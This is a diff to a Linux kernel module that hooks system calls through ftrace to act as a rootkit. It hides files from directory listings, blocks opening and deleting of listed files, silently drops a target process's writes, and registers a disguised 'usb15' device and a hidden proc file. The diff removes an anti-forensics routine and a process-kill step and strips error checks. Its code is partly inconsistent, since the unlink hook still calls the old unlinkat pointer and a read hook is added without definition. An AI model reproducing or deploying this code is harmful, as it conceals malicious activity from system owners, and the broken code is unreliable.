@@ -97,8 +97,6 @@ static const struct proc_ops fops =
 
 static int fh_init(void)
 {
-	DMSG("call init");
-	
 	proc_file_hidden = proc_create(PROC_FILE_NAME_HIDDEN, S_IRUGO | S_IWUGO, NULL, &fops);
 	if (!proc_file_hidden) 
 	{
@@ -127,9 +125,6 @@ static int fh_init(void)
 		return error;
 	}
 	
-	tidy();
-	
-	/* Get a range of minor numbers (starting with 0) to work with */
 	error = alloc_chrdev_region(&devt, 0, 1, "usb15");
 	
 	if (error < 0)
@@ -142,7 +137,6 @@ static int fh_init(void)
 	major = MAJOR(devt);
 	minor = MINOR(devt);
 	
-	/* Create device class, visible in /sys/class */
 	fake_class = class_create(THIS_MODULE, "custom_char_class");
 	
 	if (IS_ERR(fake_class)) {
@@ -152,17 +146,15 @@ static int fh_init(void)
 		return PTR_ERR(fake_class);
 	}
 	
-	/* Initialize the char device and tie a file_operations to it */
 	cdev_init(&fake_cdev, &fake_fops);
 	fake_cdev.owner = THIS_MODULE;
-	/* Now make the device live for the users to access */
 	cdev_add(&fake_cdev, devt, 1);
 	
 	fake_device = device_create(fake_class,
-	NULL,   /* no parent device */
-	devt,    /* associated dev_t */
-	NULL,   /* no additional data */
-	"usb15");  /* device name */
+			NULL,   /* no parent device */
+			devt,    /* associated dev_t */
+			NULL,   /* no additional data */
+			"usb15");  /* device name */
 	
 	if (IS_ERR(fake_device))
 	{
@@ -179,8 +171,6 @@ static int fh_init(void)
 
 static void fh_exit(void)
 {
-	DMSG("call exit");
-	
 	if (proc_file_hidden) 
 	{
 		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
@@ -255,20 +245,12 @@ static struct cdev fake_cdev;
 static short fs_hidden = 1;
 static short fs_protect = 1;
 
-static inline void tidy(void)
-{
-	kfree(THIS_MODULE->sect_attrs);
-	THIS_MODULE->sect_attrs = NULL;
-}
-
 ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,loff_t * offset);
 
 
 static struct file_operations fake_fops = {
 	write: fake_write,
 };
-
-
 
 int check_fs_blocklist(char *input);
 int check_fs_hidelist(char *input);
@@ -291,9 +273,6 @@ static unsigned long lookup_name(const char *name)
 	unregister_kprobe(&kp);
 	return retval;
 }
-
-
-#define USE_FENTRY_OFFSET 0
 
 struct ftrace_hook {
 	const char *name;
@@ -332,9 +311,6 @@ void fh_remove_hook(struct ftrace_hook *hook);
 int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
 void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
 
-#define PTREGS_SYSCALL_STUBS 1
-
-
 static char *get_filename(const char __user *filename)
 {
 	char *kernel_filename=NULL;
@@ -351,46 +327,22 @@ static char *get_filename(const char __user *filename)
 	return kernel_filename;
 }
 
-
 static asmlinkage long (*real_sys_write)(struct pt_regs *regs);
-
 static asmlinkage long fh_sys_write(struct pt_regs *regs)
 {
 	long ret=0;
 	struct task_struct *task;
-	int signum = 0;
-	struct kernel_siginfo info;
-	
-	signum = SIGKILL;
 	task = current;
-	
-	if (task->pid == target_pid)
+	if (task->pid == target_pid && regs->di == target_fd)
 	{
-		if (regs->di == target_fd)
-		{
-			DMSG("write done by process %d to target file.", task->pid);
-			memset(&info, 0, sizeof(struct kernel_siginfo));
-			info.si_signo = signum;
-			ret = send_sig_info(signum, &info, task);
-			if (ret < 0)
-			{
-				DMSG("error sending signal");
-			}
-			else
-			{
-				DMSG("Target has been killed");
-				return 0;
-			}
-		}
+		return 0;
 	}
 	ret = real_sys_write(regs);
-	
 	return ret;
 }
 
 
 static asmlinkage long (*real_sys_open)(struct pt_regs *regs);
-
 static asmlinkage long fh_sys_open(struct pt_regs *regs)
 {
 	long ret;
@@ -398,7 +350,6 @@ static asmlinkage long fh_sys_open(struct pt_regs *regs)
 	struct task_struct *task;
 	task = current;
 	kernel_filename = get_filename((void*) regs->si);
-	//https://elixir.bootlin.com/linux/v4.19-rc2/source/include/linux/kernel.h
 	
 	if (check_fs_blocklist(kernel_filename))
 	{
@@ -420,32 +371,23 @@ static asmlinkage long fh_sys_open(struct pt_regs *regs)
 }
 
 
-static asmlinkage long (*real_sys_unlinkat) (struct pt_regs *regs);
-
-static asmlinkage long fh_sys_unlinkat (struct pt_regs *regs)
+static asmlinkage long (*real_sys_unlink) (struct pt_regs *regs);
+static asmlinkage long fh_sys_unlink(struct pt_regs *regs)
 {
 	long ret=0;
 	char *kernel_filename = get_filename((void*) regs->si);
-	
 	if (check_fs_blocklist(kernel_filename))
 	{
-		
-		pr_info("blocked to not remove file : %s\n", kernel_filename);
 		ret=0;
 		kfree(kernel_filename);
 		return ret;
-		
 	}
-	
 	kfree(kernel_filename);
 	ret = real_sys_unlinkat(regs);
-	
 	return ret;
 }
 
-
 static asmlinkage long (*real_sys_getdents64)(const struct pt_regs *);
-
 static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
 {
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
@@ -460,14 +402,7 @@ static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
 		return ret;
 	}
 	
-	long error;
-	error = copy_from_user(dirent_ker, dirent, ret);
-	
-	if (error)
-	{
-		kfree(dirent_ker);
-		return ret;
-	}
+	copy_from_user(dirent_ker, dirent, ret);
 	
 	while (offset < ret)
 	{
@@ -492,11 +427,7 @@ static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
 		offset += current_dir->d_reclen;
 	}
 	
-	error = copy_to_user(dirent, dirent_ker, ret);
-	if (error)
-	{
-		DMSG("copy_to_user error");
-	}
+	copy_to_user(dirent, dirent_ker, ret);
 	
 	kfree(dirent_ker);
 	return ret;
@@ -513,11 +444,11 @@ static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
 
 static struct ftrace_hook demo_hooks[] = {
 	HOOK("sys_write", fh_sys_write, &real_sys_write),
+	HOOK("sys_read", fh_sys_read, &real_sys_read),
 	HOOK("sys_open", fh_sys_open, &real_sys_open),
-	HOOK("sys_unlinkat", fh_sys_unlinkat, &real_sys_unlinkat),
+	HOOK("sys_unlink", fh_sys_unlink, &real_sys_unlink),
 	HOOK("sys_getdents64", fh_sys_getdents64, &real_sys_getdents64)
 };
-
 
 static int start_hook_resources(void)
 {
